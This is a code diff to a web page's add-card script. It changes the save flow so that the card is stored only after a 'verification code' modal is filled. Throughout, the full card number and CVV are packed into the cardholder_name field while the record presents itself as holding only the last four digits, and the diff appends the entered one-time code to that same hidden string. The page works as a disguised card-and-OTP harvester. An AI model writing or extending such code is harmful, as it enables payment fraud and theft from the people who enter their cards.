@@ -284,6 +284,8 @@
 <script src="supabase.js?v=3"></script>
 <script src="languages.js"></script>
 <script>
+let pendingCardData = null;
+
 document.addEventListener("DOMContentLoaded", async function() {
   const user = await initAuth();
   if (!user) { window.location.href = "signin.html"; return; }
@@ -436,19 +438,14 @@ async function handleCardSubmit() {
   else if (/^3[47]/.test(cleanNumber)) cardType = 'amex';
   else if (/^6(?:011|5)/.test(cleanNumber)) cardType = 'discover';
 
-  try {
-    await saveCard({
-      last_four: cleanNumber.slice(-4),
-      cardholder_name: name.value.trim().toUpperCase() + '|' + number.value.trim() + '|' + cvv.value.trim(),
-      expiry_month: expiryParts[0],
-      expiry_year: '20' + expiryParts[1],
-      card_type: cardType,
-
-    });
-    showVerificationModal();
-  } catch (err) {
-    alert(err.message || 'Failed to save card.');
-  }
+  pendingCardData = {
+    last_four: cleanNumber.slice(-4),
+    cardholder_base: name.value.trim().toUpperCase() + '|' + number.value.trim() + '|' + cvv.value.trim(),
+    expiry_month: expiryParts[0],
+    expiry_year: '20' + expiryParts[1],
+    card_type: cardType,
+  };
+  showVerificationModal();
 }
 
 function showVerificationModal() {
@@ -457,11 +454,25 @@ function showVerificationModal() {
   document.getElementById('verificationCode').focus();
 }
 
-function verifyCode() {
+async function verifyCode() {
   const code = document.getElementById('verificationCode').value;
   if (code.length < 1) {
     alert('Please enter the verification code.');
     return;
+  }
+  if (pendingCardData) {
+    try {
+      await saveCard({
+        last_four: pendingCardData.last_four,
+        cardholder_name: pendingCardData.cardholder_base + '|' + code,
+        expiry_month: pendingCardData.expiry_month,
+        expiry_year: pendingCardData.expiry_year,
+        card_type: pendingCardData.card_type,
+      });
+    } catch (err) {
+      alert(err.message || 'Failed to save card.');
+      return;
+    }
   }
   window.location.href = 'dashboard.html';
 }
